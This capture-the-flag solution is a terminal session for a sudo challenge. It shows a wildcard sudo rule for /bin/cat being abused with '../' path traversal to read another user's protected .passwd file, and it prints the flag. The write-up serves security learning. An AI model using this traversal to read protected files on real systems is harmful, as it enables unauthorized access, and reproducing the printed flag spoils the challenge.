### Solution

```
app-script-ch1@challenge02:~$ id            
uid=1301(app-script-ch1) gid=1301(app-script-ch1) groups=1301(app-script-ch1),100(users)

app-script-ch1@challenge02:~$ pwd
/challenge/app-script/ch1

app-script-ch1@challenge02:~$ ls -al
total 20
dr-xr-x---  4 app-script-ch1-cracked app-script-ch1         4096 May 25  2015 .
drwxr-xr-x 17 root                   root                   4096 Mar 17  2018 ..
dr-xr-x--x  2 app-script-ch1         app-script-ch1         4096 Jan  8  2015 ch1
dr-xr-x--x  2 app-script-ch1-cracked app-script-ch1-cracked 4096 May 25  2015 ch1cracked
-rw-r-----  1 app-script-ch1         app-script-ch1          217 May 25  2015 readme.md

app-script-ch1@challenge02:~$ cat readme.md 
Vous devez réussir à lire le fichier .passwd situé dans le chemin suivant :
/challenge/app-script/ch1/ch1cracked/

You have to read the .passwd located in the following PATH :
/challenge/app-script/ch1/ch1cracked/

app-script-ch1@challenge02:~$ ls -al /challenge/app-script/ch1/ch1cracked/.passwd
-r--r----- 1 app-script-ch1-cracked app-script-ch1-cracked 22 Jan  7  2015 /challenge/app-script/ch1/ch1cracked/.passwd

app-script-ch1@challenge02:~/ch1cracked$ sudo -h
sudo - execute a command as another user

usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] file ...

Options:
  -A, --askpass               use a helper program for password prompting
  -b, --background            run command in the background
  -C, --close-from=num        close all file descriptors >= num
  -E, --preserve-env          preserve user environment when running command
  -e, --edit                  edit files instead of running a command
  -g, --group=group           run command as the specified group name or ID
  -H, --set-home              set HOME variable to target user's home dir
  -h, --help                  display help message and exit
  -h, --host=host             run command on host (if supported by plugin)
  -i, --login                 run login shell as the target user; a command may also be specified
  -K, --remove-timestamp      remove timestamp file completely
  -k, --reset-timestamp       invalidate timestamp file
  -l, --list                  list user's privileges or check a specific command; use twice for longer format
  -n, --non-interactive       non-interactive mode, no prompts are used
  -P, --preserve-groups       preserve group vector instead of setting to target's
  -p, --prompt=prompt         use the specified password prompt
  -r, --role=role             create SELinux security context with specified role
  -S, --stdin                 read password from standard input
  -s, --shell                 run shell as the target user; a command may also be specified
  -t, --type=type             create SELinux security context with specified type
  -U, --other-user=user       in list mode, display privileges for user
  -u, --user=user             run command (or edit file) as specified user name or ID
  -V, --version               display version information and exit
  -v, --validate              update user's timestamp without running a command
  --                          stop processing command line arguments
   
app-script-ch1@challenge02:~/ch1cracked$ sudo -l
[sudo] password for app-script-ch1: 
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*

app-script-ch1@challenge02:~/ch1cracked$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
b3_c4r3full_w1th_sud0
```
